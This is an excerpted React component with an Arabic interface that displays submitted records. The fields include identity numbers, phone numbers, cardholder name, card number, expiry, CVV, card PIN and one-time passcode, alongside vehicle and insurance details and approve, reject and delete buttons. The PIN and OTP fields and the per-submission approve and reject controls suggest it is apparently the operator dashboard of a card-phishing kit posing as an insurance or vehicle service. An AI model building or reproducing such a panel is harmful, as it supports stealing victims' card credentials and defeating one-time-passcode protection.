...
export function NotificationDetail({ notification, onApprove, onReject, onDelete }: NotificationDetailProps) {
  if (!notification) {
    return (
      <div className="flex flex-col items-center justify-center h-full text-center p-4">
        ...
        <p className="text-muted-foreground max-w-md">يرجى اختيار إشعار من القائمة الجانبية لعرض التفاصيل الكاملة</p>
      </div>
    )
  }
      ...
      <div className="p-4">
        ...
        >
              ...
              <div className="flex items-center gap-3">
                ...
                <div>
                  ...
                  <div className="flex items-center gap-2 mt-1">
                    <span className="text-sm text-muted-foreground">{notification.phone}</span>
                    {getPageType(notification.pagename)}
                  </div>
                </div>
              </div>
              <div className="text-left">
                <div className="text-sm font-medium">{format(new Date(notification.createdDate), "yyyy/MM/dd")}</div>
          ...
          <CardContent className="pb-0">
            <Tabs defaultValue="details" className="mt-4">
              <TabsList className="grid w-full grid-cols-3 mb-4">
                ...
                {notification.card_number && <TabsTrigger value="card">بيانات البطاقة</TabsTrigger>}
                {notification.vehicle_type && <TabsTrigger value="vehicle">بيانات المركبة</TabsTrigger>}
              </TabsList>
              ...
              <TabsContent value="details" className="space-y-4">
                ...
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                  ...
                  <div className="flex items-center gap-2 mt-1">
                    ...
                    <p className="font-medium text-lg font-mono">
                      {notification.owner_identity_number || notification.buyer_identity_number || "غير محدد"}
                    </p>
                  </div>
                </div>
                ...
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                  ...
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium text-lg font-mono">{notification.phone}</p>
                  </div>
                </div>

                {notification.phone2 && (
                  <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                    <p className="text-sm text-muted-foreground">رقم الهاتف 2</p>
                    <div className="flex items-center gap-2 mt-1">
                      <p className="font-medium text-lg font-mono">{notification.phone2}</p>
                    </div>
                  </div>
                )}
                ...
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                  ...
                  <div className="flex items-center gap-2 mt-1">
                    <p className="font-medium">
                      {notification.pagename || notification.insurance_purpose || "غير محدد"}
                    </p>
                  </div>
                </div>
                ...
                <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                  ...
                  <div className="flex items-center gap-2 mt-1">{getStatusBadge(notification.status)}</div>
                </div>
              </TabsContent>
              ...
              {notification.card_number && (
                <TabsContent value="card" className="space-y-4">
                  <div className="p-5 rounded-lg bg-gradient-to-r from-slate-700 to-slate-800 dark:from-slate-600 dark:to-slate-700 text-white shadow-lg">
                    <div className="flex justify-between items-start mb-6">
                      <div className="flex flex-col">
                        ...
                        <span className="font-medium">
                          {notification.document_owner_full_name || notification.full_name || "غير محدد"}
                        </span>
                      </div>
                    ...
                    <div className="flex justify-between">
                      <div>
                        ...
                        <span className="font-mono">{notification.expiration_date || "غير محدد"}</span>
                      </div>
                      <div>
                        <span className="text-xs text-slate-300 block">رمز الأمان</span>
                        <span className="font-mono">{notification.cvv || "غير محدد"}</span>
                      </div>
                    </div>
                  </div>
                  ...
                  {notification.pinCode && (
                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                      <p className="text-sm text-muted-foreground">الرقم السري</p>
                      <div className="flex items-center gap-2 mt-1">
                        <p className="font-medium text-lg font-mono">{notification.pinCode}</p>
                      </div>
                    </div>
                  )}
                  ...
                  {notification.otpCode && (
                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                      ...
                      <div className="flex items-center gap-2 mt-1">
                        <p className="font-medium text-lg font-mono">{notification.otpCode}</p>
                      </div>
                    </div>
                  )}
                </TabsContent>
                ...
                <TabsContent value="vehicle" className="space-y-4">
                  <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                    ...
                    <div className="flex items-center gap-2 mt-1">
                      ...
                      <p className="font-medium text-lg">{notification.vehicle_type}</p>
                    </div>
                  </div>
                  ...
                  {notification.vehicle_manufacture_number && (
                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                      ...
                      <div className="flex items-center gap-2 mt-1">
                        <p className="font-medium text-lg font-mono">{notification.vehicle_manufacture_number}</p>
                      </div>
                    </div>
                  )}
                  ...
                  {notification.customs_code && (
                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                      ...
                      <div className="flex items-center gap-2 mt-1">
                        <p className="font-medium text-lg font-mono">{notification.customs_code}</p>
                      </div>
                    </div>
                  )}
                  ...
                  {notification.seller_identity_number && (
                    <div className="p-4 rounded-lg bg-slate-50 dark:bg-slate-800 flex flex-col gap-1">
                      ...
                      <div className="flex items-center gap-2 mt-1">
                        <Shield className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                        <p className="font-medium text-lg font-mono">{notification.seller_identity_number}</p>
                      </div>
                    </div>
                  )}
                </TabsContent>
          ...
          <CardFooter className="flex gap-2 mt-6 pt-4 border-t">
            ...
            <Button onClick={() => onDelete(notification.id)} variant="outline" className="flex-1">
